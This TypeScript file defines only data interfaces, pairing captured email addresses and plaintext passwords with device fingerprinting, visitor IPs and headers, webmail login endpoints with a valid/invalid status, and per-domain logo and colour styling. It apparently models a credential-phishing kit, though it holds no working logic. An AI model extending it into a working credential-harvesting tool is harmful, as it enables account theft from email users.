export interface SystemInfo {
  platform: string;
  userAgent: string;
  language: string;
  timezone: string;
  screenResolution: string;
  colorDepth: number;
  deviceMemory: any;
  cpuCores: number;
  cookiesEnabled: boolean;
}

export interface SessionData {
  visitorId: string;
  ipAddress: string;
  headers: Record<string, string>;
  callerId: string | null;
}

export interface WebmailData {
  loginUrl: string;
  loginEndpoint: string;
  loginStatus: 'valid' | 'invalid' | 'pending';
  domainStyle: {
    logoUrl: string;
    backgroundColor: string;
  };
}

export interface AuthFlowData {
  loginAttempts: number;
  authStatus: string;
  redirectUrl: string;
}

export interface EmailData {
  email: string;
  password: string;
  systemInfo: SystemInfo;
  sessionData: SessionData;
  webmailData: WebmailData;
  authFlowData: AuthFlowData;
}